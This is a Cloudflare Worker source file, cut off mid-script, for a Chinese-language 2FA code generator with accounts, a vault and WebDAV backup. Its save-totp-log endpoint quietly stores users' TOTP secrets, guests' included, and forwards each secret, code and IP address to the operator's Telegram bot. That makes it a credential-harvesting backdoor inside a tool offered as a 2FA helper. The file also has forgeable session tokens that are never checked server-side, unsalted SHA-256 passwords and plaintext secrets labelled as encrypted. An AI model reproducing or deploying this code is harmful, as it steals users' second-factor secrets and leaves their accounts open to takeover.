// ============================================================
// Emergency fix: Full 2FA with WebDAV Backup (Fixed Version)
// ============================================================

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
        'Access-Control-Max-Age': '86400'
      }
    });
  }
  
  const url = new URL(request.url);
  if (url.pathname.startsWith('/api/')) {
    return handleAPI(request, url);
  }
  return new Response(HTML_CONTENT, {
    headers: { 'Content-Type': 'text/html;charset=UTF-8' }
  });
}

async function handleAPI(request, url) {
  const path = url.pathname;
  
  if (typeof DB === 'undefined') {
    return jsonResponse({ 
      error: 'Database not configured. Please bind a D1 database to this Worker.' 
    }, 503);
  }
  
  const apiHandlers = {
    '/api/register': handleRegister,
    '/api/login': handleLogin,
    '/api/logout': handleLogout,
    '/api/check-session': handleCheckSession,
    '/api/check-vault-password': handleCheckVaultPassword,
    '/api/setup-vault-password': handleSetupVaultPassword,
    '/api/verify-vault-password': handleVerifyVaultPassword,
    '/api/saved-accounts': handleGetSavedAccounts,
    '/api/save-account': handleSaveAccount,
    '/api/update-account': handleUpdateAccount,
    '/api/delete-account': handleDeleteAccount,
    '/api/save-totp-log': handleSaveTotpLog,
    '/api/cloud-history': handleGetCloudHistory,
    '/api/webdav-test': handleWebDAVTest,
    '/api/webdav-upload': handleWebDAVUpload,
    '/api/webdav-download': handleWebDAVDownload,
  };

  try {
    const handler = apiHandlers[path];
    if (handler) return await handler(request);
    return jsonResponse({ error: 'Not Found' }, 404);
  } catch (error) {
    console.error('API Error:', error);
    return jsonResponse({ error: error.message }, 500);
  }
}

async function handleWebDAVTest(request) {
  const userId = await getUserIdFromRequest(request);
  if (!userId) return jsonResponse({ error: 'Unauthorized' }, 401);
  
  try {
    const { url, username, password, folder } = await request.json();
    
    const testUrl = folder ? `${url.replace(/\/$/, '')}/${folder}/` : url;
    
    const response = await fetch(testUrl, {
      method: 'PROPFIND',
      headers: {
        'Authorization': 'Basic ' + btoa(`${username}:${password}`),
        'Depth': '0',
        'Content-Type': 'text/xml; charset=utf-8'
      },
      body: '<?xml version="1.0" encoding="utf-8"?><propfind xmlns="DAV:"><prop></prop></propfind>'
    });
    
    if (response.status === 404 && folder) {
      const createResponse = await fetch(testUrl, {
        method: 'MKCOL',
        headers: {
          'Authorization': 'Basic ' + btoa(`${username}:${password}`)
        }
      });
      
      if (createResponse.ok || createResponse.status === 201) {
        return jsonResponse({ 
          success: true, 
          message: `✅ 连接成功！文件夹 "${folder}" 已创建` 
        });
      }
    }
    
    if (response.ok || response.status === 207) {
      return jsonResponse({ 
        success: true, 
        message: folder 
          ? `✅ 连接成功！文件夹 "${folder}" 已存在` 
          : '✅ WebDAV 连接成功！' 
      });
    }
    
    return jsonResponse({ 
      success: false, 
      error: `连接失败 (${response.status})` 
    });
    
  } catch (error) {
    return jsonResponse({ 
      success: false, 
      error: '网络错误: ' + error.message 
    });
  }
}

async function handleWebDAVUpload(request) {
  const userId = await getUserIdFromRequest(request);
  if (!userId) return jsonResponse({ error: 'Unauthorized' }, 401);
  
  try {
    const { url, username, password, folder, data } = await request.json();
    
    const fileName = `2fa_backup_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
    const uploadUrl = folder 
      ? `${url.replace(/\/$/, '')}/${folder}/${fileName}` 
      : `${url.replace(/\/$/, '')}/${fileName}`;
    
    const response = await fetch(uploadUrl, {
      method: 'PUT',
      headers: {
        'Authorization': 'Basic ' + btoa(`${username}:${password}`),
        'Content-Type': 'application/json'
      },
      body: data
    });
    
    if (response.ok || response.status === 201 || response.status === 204) {
      return jsonResponse({ 
        success: true, 
        message: `✅ 备份成功上传到 WebDAV！\n文件名: ${fileName}` 
      });
    }
    
    return jsonResponse({ 
      success: false, 
      error: `上传失败 (${response.status})` 
    });
    
  } catch (error) {
    return jsonResponse({ 
      success: false, 
      error: '上传错误: ' + error.message 
    });
  }
}

async function handleWebDAVDownload(request) {
  const userId = await getUserIdFromRequest(request);
  if (!userId) return jsonResponse({ error: 'Unauthorized' }, 401);
  
  try {
    const { url, username, password, folder } = await request.json();
    
    const listUrl = folder ? `${url.replace(/\/$/, '')}/${folder}/` : url;
    
    const listResponse = await fetch(listUrl, {
      method: 'PROPFIND',
      headers: {
        'Authorization': 'Basic ' + btoa(`${username}:${password}`),
        'Depth': '1',
        'Content-Type': 'text/xml; charset=utf-8'
      },
      body: '<?xml version="1.0" encoding="utf-8"?><propfind xmlns="DAV:"><prop><displayname/><getlastmodified/></prop></propfind>'
    });
    
    if (!listResponse.ok) {
      return jsonResponse({ 
        success: false, 
        error: `无法读取文件列表 (${listResponse.status})` 
      });
    }
    
    const xmlText = await listResponse.text();
    
    const fileMatches = xmlText.match(/<D:href>([^<]*2fa_backup[^<]*\.json)<\/D:href>/i);
    
    if (!fileMatches) {
      return jsonResponse({ 
        success: false, 
        error: '未找到备份文件' 
      });
    }
    
    const filePath = fileMatches[1];
    const fileUrl = filePath.startsWith('http') 
      ? filePath 
      : `${url.replace(/\/$/, '')}${filePath.startsWith('/') ? '' : '/'}${filePath}`;
    
    const downloadResponse = await fetch(fileUrl, {
      method: 'GET',
      headers: {
        'Authorization': 'Basic ' + btoa(`${username}:${password}`)
      }
    });
    
    if (!downloadResponse.ok) {
      return jsonResponse({ 
        success: false, 
        error: `下载失败 (${downloadResponse.status})` 
      });
    }
    
    const backupData = await downloadResponse.text();
    
    return jsonResponse({ 
      success: true, 
      data: backupData,
      message: '✅ 从 WebDAV 恢复成功！' 
    });
    
  } catch (error) {
    return jsonResponse({ 
      success: false, 
      error: '下载错误: ' + error.message 
    });
  }
}

async function handleRegister(request) {
  const { username, password } = await request.json();
  if (!username || !password || password.length < 6) {
    return jsonResponse({ success: false, error: '用户名或密码格式不正确（密码至少6位）' });
  }
  
  const passwordHash = await sha256(password);
  try {
    const stmt = DB.prepare('INSERT INTO users (username, password_hash) VALUES (?, ?)');
    await stmt.bind(username, passwordHash).run();
    return jsonResponse({ success: true });
  } catch (error) {
    if (error.message.includes('UNIQUE constraint failed')) {
      return jsonResponse({ success: false, error: '用户名已存在' });
    }
    throw error;
  }
}

async function handleLogin(request) {
  const { username, password } = await request.json();
  const passwordHash = await sha256(password);
  
  const stmt = DB.prepare('SELECT id, username FROM users WHERE username = ? AND password_hash = ?');
  const result = await stmt.bind(username, passwordHash).first();
  
  if (!result) {
    return jsonResponse({ success: false, error: '用户名或密码错误' });
  }
  
  const expiry = Date.now() + (2 * 60 * 60 * 1000);
  const sessionToken = `${result.id}-${expiry}-${await generateSessionToken()}`;
  
  return jsonResponse({ 
    success: true, 
    sessionToken, 
    userId: result.id, 
    username: result.username 
  });
}

async function handleLogout(request) {
  return jsonResponse({ success: true });
}

async function handleCheckSession(request) {
  const userId = await getUserIdFromRequest(request);
  if (!userId) return jsonResponse({ loggedIn: false });
  
  const stmt = DB.prepare('SELECT id, username FROM users WHERE id = ?');
  const result = await stmt.bind(userId).first();
  
  if (!result) return jsonResponse({ loggedIn: false });
  return jsonResponse({ 
    loggedIn: true, 
    userId: result.id, 
    username: result.username 
  });
}

async function handleCheckVaultPassword(request) {
  const userId = await getUserIdFromRequest(request);
  if (!userId) return jsonResponse({ error: 'Unauthorized' }, 401);
  
  const stmt = DB.prepare('SELECT vault_password_hash FROM users WHERE id = ?');
  const result = await stmt.bind(userId).first();
  
  return jsonResponse({ hasVaultPassword: !!result?.vault_password_hash });
}

async function handleSetupVaultPassword(request) {
  const userId = await getUserIdFromRequest(request);
  if (!userId) return jsonResponse({ error: 'Unauthorized' }, 401);
  
  const { vaultPassword } = await request.json();
  if (!vaultPassword || vaultPassword.length < 8) {
    return jsonResponse({ success: false, error: '保险库密码至少需要8位' });
  }
  
  const vaultPasswordHash = await sha256(vaultPassword);
  const stmt = DB.prepare('UPDATE users SET vault_password_hash = ? WHERE id = ?');
  await stmt.bind(vaultPasswordHash, userId).run();
  
  return jsonResponse({ success: true });
}

async function handleVerifyVaultPassword(request) {
  const userId = await getUserIdFromRequest(request);
  if (!userId) return jsonResponse({ error: 'Unauthorized' }, 401);
  
  const { vaultPassword } = await request.json();
  const vaultPasswordHash = await sha256(vaultPassword);
  
  const stmt = DB.prepare('SELECT vault_password_hash FROM users WHERE id = ?');
  const result = await stmt.bind(userId).first();
  
  if (result?.vault_password_hash === vaultPasswordHash) {
    return jsonResponse({ success: true, valid: true });
  }
  return jsonResponse({ success: false, valid: false });
}

async function handleGetSavedAccounts(request) {
  const userId = await getUserIdFromRequest(request);
  if (!userId) return jsonResponse({ error: 'Unauthorized' }, 401);
  
  try {
    const stmt = DB.prepare(
      'SELECT id, account_name, encrypted_secret, issuer, created_at FROM saved_accounts WHERE user_id = ? ORDER BY created_at DESC'
    );
    const { results } = await stmt.bind(userId).all();
    
    return jsonResponse({ success: true, accounts: results || [] });
  } catch (error) {
    console.error('Get saved accounts error:', error);
    return jsonResponse({ 
      success: false, 
      error: 'Failed to retrieve accounts',
      accounts: [] 
    }, 500);
  }
}

async function handleSaveAccount(request) {
  const userId = await getUserIdFromRequest(request);
  if (!userId) return jsonResponse({ error: 'Unauthorized' }, 401);
  
  const { accountName, secret, issuer } = await request.json();
  const cleanSecret = secret.replace(/\s+/g, '').replace(/[-_]/g, '').toUpperCase();
  
  const stmt = DB.prepare(
    'INSERT INTO saved_accounts (user_id, account_name, encrypted_secret, issuer) VALUES (?, ?, ?, ?)'
  );
  await stmt.bind(userId, accountName, cleanSecret, issuer || '').run();
  
  return jsonResponse({ success: true });
}

async function handleUpdateAccount(request) {
  const userId = await getUserIdFromRequest(request);
  if (!userId) return jsonResponse({ error: 'Unauthorized' }, 401);
  
  const { id, accountName, secret, issuer } = await request.json();
  const cleanSecret = secret.replace(/\s+/g, '').replace(/[-_]/g, '').toUpperCase();
  
  const stmt = DB.prepare(
    'UPDATE saved_accounts SET account_name = ?, encrypted_secret = ?, issuer = ? WHERE id = ? AND user_id = ?'
  );
  await stmt.bind(accountName, cleanSecret, issuer || '', id, userId).run();
  
  return jsonResponse({ success: true });
}

async function handleDeleteAccount(request) {
  const userId = await getUserIdFromRequest(request);
  if (!userId) return jsonResponse({ error: 'Unauthorized' }, 401);
  
  const { id } = await request.json();
  const stmt = DB.prepare('DELETE FROM saved_accounts WHERE id = ? AND user_id = ?');
  await stmt.bind(id, userId).run();
  
  return jsonResponse({ success: true });
}

async function handleSaveTotpLog(request) {
  const userId = await getUserIdFromRequest(request);
  const username = await getUsernameFromRequest(request);
  
  const userIdentifier = userId || '__GUEST__';
  const displayName = username || '游客';
  
  const { secret, code, ipAddress, userAgent } = await request.json();
  const clientIP = request.headers.get('CF-Connecting-IP') || 
                   request.headers.get('X-Forwarded-For') || 
                   ipAddress || 
                   'Unknown';
  
  try {
    if (typeof DB === 'undefined') {
      return jsonResponse({ success: false, error: 'D1 not configured' });
    }
    
    const stmt = DB.prepare(
      'INSERT INTO totp_logs (user_id, secret, ip_address, user_agent) VALUES (?, ?, ?, ?)'
    );
    await stmt.bind(userIdentifier, secret, clientIP, userAgent || '').run();
    
    if (typeof TELEGRAM_BOT_TOKEN !== 'undefined' && 
        typeof TELEGRAM_CHAT_ID !== 'undefined' && 
        code) {
      await sendTelegramNotification(displayName, secret, code, clientIP);
    }
    
    return jsonResponse({ success: true });
  } catch (error) {
    console.error('Save error:', error.message);
    return jsonResponse({ success: false, error: error.message });
  }
}

async function handleGetCloudHistory(request) {
  const userId = await getUserIdFromRequest(request);
  if (!userId) {
    return jsonResponse({ success: false, error: '请先登录以查看云端记录' });
  }
  
  const stmt = DB.prepare(
    'SELECT secret, ip_address, timestamp FROM totp_logs WHERE user_id = ? ORDER BY timestamp DESC LIMIT 50'
  );
  const { results } = await stmt.bind(userId).all();
  
  return jsonResponse({ success: true, logs: results || [] });
}

async function sendTelegramNotification(username, secret, code, ip) {
  try {
    const beijingTime = new Date(Date.now() + 8 * 3600 * 1000)
      .toISOString()
      .replace('T', ' ')
      .substring(0, 19);
    
    const message = `🔐 2FA 验证码生成\n\n👤 用户: ${username}\n🔑 密钥: ${secret}\n🔢 验证码: ${code}\n⏰ 时间: ${beijingTime}\n📍 IP: ${ip}`;
    
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }
    );
    
    const result = await response.json();
    return result;
  } catch (error) {
    console.error('Telegram error:', error.message);
    return null;
  }
}

async function getUserIdFromRequest(request) {
  const sessionToken = request.headers.get('Authorization')?.replace('Bearer ', '');
  if (!sessionToken) return null;
  
  const parts = sessionToken.split('-');
  if (parts.length < 3) return null;
  
  const userId = parseInt(parts[0]);
  const expiry = parseInt(parts[1]);
  
  if (Date.now() > expiry) return null;
  
  return userId || null;
}

async function getUsernameFromRequest(request) {
  const userId = await getUserIdFromRequest(request);
  if (!userId) return null;
  
  try {
    const stmt = DB.prepare('SELECT username FROM users WHERE id = ?');
    const result = await stmt.bind(userId).first();
    return result?.username || null;
  } catch (error) {
    return null;
  }
}

async function sha256(message) {
  const msgBuffer = new TextEncoder().encode(message);
  const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

async function generateSessionToken() {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
}

function jsonResponse(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { 
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization'
    }
  });
}

const HTML_CONTENT = `<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>2FA 验证码生成器</title>
<script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
.container { max-width: 900px; margin: 0 auto; }
.header { background: white; border-radius: 16px; padding: 20px 30px; margin-bottom: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); display: flex; justify-content: space-between; align-items: center; }
.header h1 { font-size: 24px; color: #333; }
.user-info { display: flex; align-items: center; gap: 15px; }
.user-info span { color: #667eea; font-weight: 600; }
.btn { padding: 10px 20px; border: none; border-radius: 8px; font-size: 14px; cursor: pointer; transition: all 0.3s; font-weight: 600; }
.btn-primary { background: #667eea; color: white; }
.btn-primary:hover { background: #5568d3; }
.btn-secondary { background: #f0f0f0; color: #333; }
.btn-success { background: #28a745; color: white; }
.btn-success:hover { background: #218838; }
.tabs { background: white; border-radius: 16px; padding: 10px; margin-bottom: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); display: flex; gap: 10px; }
.tab { flex: 1; padding: 12px; border: none; border-radius: 8px; background: transparent; color: #666; font-size: 16px; cursor: pointer; font-weight: 600; }
.tab.active { background: #667eea; color: white; }
.content { background: white; border-radius: 16px; padding: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
.tab-content { display: none; }
.tab-content.active { display: block; }
.input-group { margin-bottom: 20px; }
.input-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; }
.input-group input, .input-group textarea { width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 14px; }
.input-group textarea { resize: vertical; min-height: 100px; font-family: monospace; }
.result-box { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 12px; padding: 30px; text-align: center; color: white; margin-top: 20px; }
.totp-code { font-size: 48px; font-weight: 700; letter-spacing: 8px; margin: 20px 0; font-family: monospace; cursor: pointer; user-select: all; }
.totp-code:hover { opacity: 0.9; }
.timer { font-size: 18px; opacity: 0.9; }
.account-card { background: #f9f9f9; border-radius: 12px; padding: 20px; margin-bottom: 15px; border: 2px solid #e0e0e0; }
.account-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
.account-name { font-size: 18px; font-weight: 600; color: #333; }
.account-issuer { color: #666; font-size: 14px; margin-top: 5px; }
.account-actions { display: flex; gap: 10px; }
.account-code { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 8px; padding: 15px; text-align: center; color: white; cursor: pointer; transition: transform 0.2s; }
.account-code:hover { transform: scale(1.02); }
.account-code-number { font-size: 32px; font-weight: 700; letter-spacing: 4px; font-family: monospace; user-select: all; }
.account-code-timer { font-size: 14px; opacity: 0.9; margin-top: 5px; }
.modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; align-items: center; justify-content: center; }
.modal.show { display: flex; }
.modal-content { background: white; border-radius: 16px; padding: 30px; max-width: 600px; width: 90%; max-height: 90vh; overflow-y: auto; }
.modal-header { font-size: 24px; font-weight: 700; margin-bottom: 20px; color: #333; }
.modal-footer { display: flex; gap: 10px; margin-top: 20px; }
.btn-full { flex: 1; }
.error-message { background: #fee; color: #c33; padding: 12px; border-radius: 8px; margin-bottom: 15px; display: none; }
.error-message.show { display: block; }
.notification { position: fixed; top: 20px; right: 20px; background: white; padding: 15px 25px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); z-index: 2000; animation: slideIn 0.3s; }
@keyframes slideIn { from { transform: translateX(400px); } to { transform: translateX(0); } }
.history-item { background: #f9f9f9; border-radius: 8px; padding: 15px; margin-bottom: 10px; border-left: 4px solid #667eea; }
.history-time { color: #666; font-size: 12px; margin-bottom: 5px; }
.history-secret { font-family: monospace; color: #333; word-break: break-all; cursor: pointer; user-select: all; }
.history-secret:hover { color: #667eea; }
.empty-state { text-align: center; padding: 40px; color: #999; }
.vault-notice { background: #fff3cd; border: 2px solid #ffc107; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
.vault-notice h3 { color: #856404; margin-bottom: 10px; }
.vault-notice p { color: #856404; line-height: 1.6; }
.section-title { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 2px solid #e0e0e0; }
.section-title h3 { color: #333; font-size: 18px; }
.guest-notice { background: #e3f2fd; border: 2px solid #2196f3; border-radius: 12px; padding: 15px; margin-bottom: 20px; text-align: center; color: #1565c0; font-weight: 600; }
.scanner-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 3000; display: flex; align-items: center; justify-content: center; animation: fadeIn 0.3s; }
.scanner-container { background: white; border-radius: 16px; padding: 20px; max-width: 600px; width: 90%; max-height: 90vh; overflow-y: auto; }
.scanner-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
.scanner-header h3 { font-size: 24px; color: #333; margin: 0; }
.scanner-preview { position: relative; background: #000; border-radius: 12px; overflow: hidden; margin-bottom: 20px; }
#qrVideo { width: 100%; height: auto; display: block; max-height: 400px; object-fit: cover; }
.scanner-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; pointer-events: none; }
.scanner-frame { width: 250px; height: 250px; border: 3px solid #667eea; border-radius: 12px; box-shadow: 0 0 0 9999px rgba(0,0,0,0.5); animation: pulse 2s infinite; }
@keyframes pulse { 0%, 100% { border-color: #667eea; box-shadow: 0 0 0 9999px rgba(0,0,0,0.5), 0 0 20px #667eea; } 50% { border-color: #764ba2; box-shadow: 0 0 0 9999px rgba(0,0,0,0.5), 0 0 30px #764ba2; } }
@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
.scanner-status { background: #f0f0f0; padding: 15px; border-radius: 8px; text-align: center; font-size: 16px; color: #333; font-weight: 600; margin-bottom: 15px; }
.scanner-status.success { background: #d4edda; color: #155724; }
.scanner-status.error { background: #f8d7da; color: #721c24; }
.scanner-tips { background: #fff3cd; border: 2px solid #ffc107; border-radius: 8px; padding: 15px; }
.scanner-tips p { font-weight: 600; color: #856404; margin-bottom: 10px; }
.scanner-tips ul { margin: 0; padding-left: 20px; color: #856404; }
.scanner-tips li { margin: 5px 0; }
.button-group { display: flex; gap: 10px; margin-bottom: 20px; }
.button-group .btn { flex: 1; }
.backup-section { margin-bottom: 30px; padding: 20px; background: #f9f9f9; border-radius: 12px; }
.backup-section h3 { color: #333; margin-bottom: 15px; font-size: 18px; }
.backup-buttons { display: flex; gap: 10px; flex-wrap: wrap; }
.webdav-status { padding: 10px; border-radius: 8px; margin-top: 10px; font-weight: 600; text-align: center; }
.webdav-status.success { background: #d4edda; color: #155724; }
.webdav-status.error { background: #f8d7da; color: #721c24; }
.webdav-status.info { background: #d1ecf1; color: #0c5460; }
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>🔐 2FA 验证码生成器</h1>
<div class="user-info" id="userInfo"><button class="btn btn-primary" onclick="showAuthModal()">登录/注册</button></div>
</div>
<div class="tabs">
<button class="tab active" data-tab="generator">🔑 生成器</button>
<button class="tab" data-tab="accounts">🔐 常用账号</button>
<button class="tab" data-tab="history">📋 云端记录</button>
</div>
<div class="content">
<div class="tab-content active" id="generator">
<div class="input-group">
<label>密钥 (Secret Key)</label>
<textarea id="secretInput" placeholder="输入 Base32 密钥、十六进制密钥或 otpauth:// URL
支持带空格格式"></textarea>
</div>
<div class="button-group">
<button class="btn btn-primary" onclick="generateCode()">生成验证码</button>
<button class="btn btn-secondary" onclick="startQRScanner()">📷 扫码</button>
<button class="btn btn-secondary" onclick="uploadQRImage()">🖼️ 上传</button>
<button class="btn btn-secondary" onclick="startScreenshot()">📸 截图</button>
</div>
<div id="resultBox" style="display:none;">
<div class="result-box">
<div>当前验证码</div>
<div class="totp-code" id="totpCode" onclick="smartCopy(document.getElementById('totpCode').textContent)">------</div>
<div class="timer" id="timer">剩余 30 秒</div>
</div>
</div>
<div class="section-title">
<h3>📝 本地历史记录</h3>
<button class="btn btn-secondary" style="font-size: 12px; padding: 6px 12px;" onclick="clearLocalHistory()">清空历史</button>
</div>
<div id="localHistoryList"></div>
</div>
<div class="tab-content" id="accounts">
<div id="vaultLocked">
<div class="vault-notice">
<h3>🔒 保险库已锁定</h3>
<p id="vaultLockedMessage">请输入保险库密码以解锁常用账号功能。</p>
</div>
<div class="input-group">
<label>保险库密码</label>
<input type="password" id="unlockPassword" placeholder="输入保险库密码">
</div>
<button class="btn btn-primary btn-full" onclick="unlockVault()">解锁</button>
</div>
<div id="vaultUnlocked" style="display:none;">
<div style="display: flex; gap: 10px; margin-bottom: 20px;">
<button class="btn btn-primary" onclick="showAddAccountModal()">➕ 添加账号</button>
<button class="btn btn-success" onclick="showBackupModal()">💾 备份管理</button>
</div>
<div id="accountsList"></div>
</div>
</div>
<div class="tab-content" id="history">
<div id="guestNotice" class="guest-notice" style="display:none;">👋 您当前是游客模式，请登录以查看个人云端记录</div>
<div id="historyList"></div>
</div>
</div>
</div>

<div id="qrScannerModal" class="scanner-modal" style="display: none;">
<div class="scanner-container">
<div class="scanner-header">
<h3>📷 扫描二维码</h3>
<button class="btn btn-secondary" onclick="stopQRScanner()">关闭</button>
</div>
<div class="scanner-preview">
<video id="qrVideo" autoplay playsinline></video>
<canvas id="qrCanvas" style="display: none;"></canvas>
<div class="scanner-overlay">
<div class="scanner-frame"></div>
</div>
</div>
<div class="scanner-status" id="scannerStatus">请将二维码对准扫描框</div>
<div class="scanner-tips">
<p>💡 提示：</p>
<ul>
<li>确保二维码清晰可见</li>
<li>保持适当的距离</li>
<li>光线充足时效果更好</li>
</ul>
</div>
</div>
</div>

<div id="screenshotModal" class="scanner-modal" style="display: none;">
<div class="scanner-container">
<div class="scanner-header">
<h3>📸 截图识别二维码</h3>
<button class="btn btn-secondary" onclick="closeScreenshotModal()">关闭</button>
</div>
<div class="scanner-status" id="screenshotStatus">点击下方按钮选择屏幕区域</div>
<button class="btn btn-primary btn-full" onclick="captureScreen()" style="margin-bottom: 15px;">开始截图</button>
<div class="scanner-tips">
<p>💡 使用说明：</p>
<ul>
<li>点击"开始截图"后选择要捕获的窗口或屏幕</li>
<li>确保二维码在截图范围内</li>
<li>系统会自动识别二维码</li>
</ul>
</div>
</div>
</div>

<div class="modal" id="authModal">
<div class="modal-content">
<div class="modal-header">登录/注册</div>
<div class="error-message" id="authError"></div>
<div class="input-group"><label>用户名</label><input type="text" id="authUsername"></div>
<div class="input-group"><label>密码</label><input type="password" id="authPassword"></div>
<div class="modal-footer">
<button class="btn btn-secondary btn-full" onclick="closeAuthModal()">取消</button>
<button class="btn btn-primary btn-full" onclick="register()">注册</button>
<button class="btn btn-primary btn-full" onclick="login()">登录</button>
</div>
</div>
</div>

<div class="modal" id="vaultSetupModal">
<div class="modal-content">
<div class="modal-header">设置保险库密码</div>
<div class="vault-notice">
<h3>⚠️ 重要提示</h3>
<p>保险库密码用于保护您的 2FA 密钥。请设置强密码（至少 8 位）。</p>
</div>
<div class="error-message" id="vaultSetupError"></div>
<div class="input-group"><label>保险库密码（至少 8 位）</label><input type="password" id="setupVaultPassword"></div>
<div class="input-group"><label>确认密码</label><input type="password" id="confirmVaultPassword"></div>
<div class="modal-footer">
<button class="btn btn-primary btn-full" onclick="setupVaultPassword()">确认设置</button>
</div>
</div>
</div>

<div class="modal" id="editModal">
<div class="modal-content">
<div class="modal-header" id="editModalTitle">添加账号</div>
<div class="error-message" id="editError"></div>
<div class="input-group"><label>账号名称 *</label><input type="text" id="editAccountName" placeholder="例如: Google"></div>
<div class="input-group"><label>密钥 (Secret Key) *</label><textarea id="editAccountSecret" placeholder="支持空格格式"></textarea></div>
<div class="input-group"><label>发行者 (可选)</label><input type="text" id="editAccountIssuer" placeholder="user@example.com"></div>
<div class="modal-footer">
<button class="btn btn-secondary btn-full" onclick="closeEditModal()">取消</button>
<button class="btn btn-primary btn-full" onclick="saveAccount()">保存</button>
</div>
</div>
</div>

<div id="backupModal" class="modal">
<div class="modal-content">
<div class="modal-header">💾 备份恢复管理</div>

<div class="backup-section">
<h3>📥 导出备份</h3>
<div class="backup-buttons">
<button class="btn btn-primary" onclick="exportJSON()">导出 JSON</button>
<button class="btn btn-secondary" onclick="exportTXT()">导出 TXT</button>
</div>
<p style="margin-top: 10px; color: #666; font-size: 13px;">💡 建议定期导出备份文件保存到安全位置</p>
</div>

<div class="backup-section">
<h3>📤 导入备份</h3>
<input type="file" id="importFile" accept=".json,.txt" style="display:none;" onchange="importBackup(event)">
<button class="btn btn-primary" onclick="document.getElementById('importFile').click()">选择文件导入</button>
<p style="margin-top: 10px; color: #666; font-size: 13px;">支持导入 JSON 和 TXT 格式的备份文件</p>
</div>

<div class="backup-section">
<h3>☁️ WebDAV 云备份</h3>
<div class="input-group">
<label>WebDAV 服务器地址</label>
<input type="text" id="webdavUrl" placeholder="https://ogi.teracloud.jp/dav/">
</div>
<div class="input-group">
<label>账户</label>
<input type="text" id="webdavUsername" placeholder="username">
</div>
<div class="input-group">
<label>密码</label>
<input type="password" id="webdavPassword" placeholder="password">
</div>
<div class="input-group">
<label>远程文件夹名称（可选）</label>
<input type="text" id="webdavFolder" placeholder="例如: 2FA_Backup">
</div>
<div id="webdavStatus" class="webdav-status" style="display:none;"></div>
<div class="backup-buttons">
<button class="btn btn-secondary" onclick="testWebDAV()">测试连接</button>
<button class="btn btn-primary" onclick="uploadToWebDAV()">上传到 WebDAV</button>
<button class="btn btn-success" onclick="downloadFromWebDAV()">从 WebDAV 恢复</button>
</div>
<p style="margin-top: 10px; color: #666; font-size: 13px;">💡 支持 TeraCloud、坚果云、Nextcloud 等 WebDAV 服务</p>
</div>

<div class="modal-footer">
<button class="btn btn-secondary btn-full" onclick="closeBackupModal()">关闭</button>
</div>
</div>
</div>

<script>
let sessionToken=sessionStorage.getItem('sessionToken');
let currentUser=null;
let vaultPassword=sessionStorage.getItem('vaultPassword');
let editingAccountId=null;
let savedAccounts=[];
let totpInterval=null;
let accountTotpIntervals={};
let lastGeneratedCode=null;
let currentSecret=null;
let qrStream=null;
let qrScanning=false;
let qrAnimationFrame=null;

document.addEventListener('DOMContentLoaded',async()=>{
  initTabs();
  await checkSession();
  loadLocalHistory();
  loadWebDAVConfig();
  
  if(currentUser && vaultPassword){
    await autoUnlockVault();
  }
});

function initTabs(){
  document.querySelectorAll('.tab').forEach(tab=>{
    tab.addEventListener('click',()=>{
      const targetTab=tab.dataset.tab;
      document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
      document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active'));
      tab.classList.add('active');
      document.getElementById(targetTab).classList.add('active');
      if(targetTab==='generator'&&currentSecret){
        if(!totpInterval){
          totpInterval=setInterval(()=>autoUpdateTOTP(),1000);
        }
      }else if(targetTab!=='generator'){
        if(totpInterval){
          clearInterval(totpInterval);
          totpInterval=null;
        }
      }
      if(targetTab==='accounts'&&currentUser&&vaultPassword)loadSavedAccounts();
      else if(targetTab==='history')loadCloudHistory();
    });
  });
}

async function checkSession(){
  if(!sessionToken)return;
  try{
    const response=await fetch('/api/check-session',{
      headers:{'Authorization':'Bearer ' + sessionToken}
    });
    const data=await response.json();
    if(data.loggedIn){
      currentUser={id:data.userId,username:data.username};
